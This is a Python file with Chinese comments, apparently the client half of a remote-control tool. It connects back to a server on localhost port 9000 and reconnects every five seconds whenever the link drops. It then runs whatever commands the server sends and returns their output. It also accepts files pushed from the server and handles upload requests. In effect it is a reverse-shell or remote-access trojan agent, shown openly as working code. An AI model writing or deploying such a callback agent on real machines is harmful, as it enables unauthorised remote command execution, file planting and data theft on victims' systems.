#client\main.py
import socket
import time
from communication import send_data_with_header, receive_data_with_header
from commands import execute_command,download_file
import os

# 客户端配置
SERVER_IP = "127.0.0.1"
SERVER_PORT = 9000
RECONNECT_DELAY = 5  # 每次重连的间隔时间（秒）


def connect_to_server():
    """
    永久尝试连接到服务端，并处理短线重连逻辑
    """
    while True:  # 无限循环，永久尝试连接
        try:
            print("[INFO] 正在尝试连接服务端...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            print("[INFO] 已成功连接到服务端")
            handle_connection(client)  # 开始处理服务端指令
        except (socket.error, ConnectionRefusedError) as e:
            print(f"[WARNING] 无法连接到服务端：{e}")
            print(f"[INFO] {RECONNECT_DELAY} 秒后重试...")
            time.sleep(RECONNECT_DELAY)
        except KeyboardInterrupt:
            print("[INFO] 客户端已停止")
            break  # 用户手动中断时退出程序
    print("[INFO] 客户端退出")


def handle_connection(client):
    """
    处理与服务端的通信
    """
    try:
        while True:
            # 接收服务端发送的命令
            command = receive_data_with_header(client)
            if command is None or command.lower() == b"exit":
                print("[INFO] 收到退出指令，断开连接")
                break

            print(f"[SERVER] 收到指令：{command}")

            # 解码命令
            command_str = command.decode('utf-8')

            if command_str.startswith('download'):
                # 客户端准备接收文件
                file_path = os.path.basename(command_str[9:].strip())

                # 发送准备就绪消息给服务端
                send_data_with_header(client, b"ready")

                # 接收文件数据
                file_data = receive_data_with_header(client)

                # 保存文件
                message = download_file(file_path, file_data)

                # 发送保存结果回服务端
                send_data_with_header(client, message.encode('utf-8'))

            elif command_str.startswith('upload'):
                # 处理上传命令
                response = execute_command(command)
                send_data_with_header(client, response)
            else:
                # 执行其他命令
                response = execute_command(command)
                # 发送执行结果回服务端
                send_data_with_header(client, response)
    except Exception as e:
        print(f"[WARNING] 连接中断：{e}")
    finally:
        client.close()
        print("[INFO] 客户端已关闭连接")


if __name__ == "__main__":
    connect_to_server()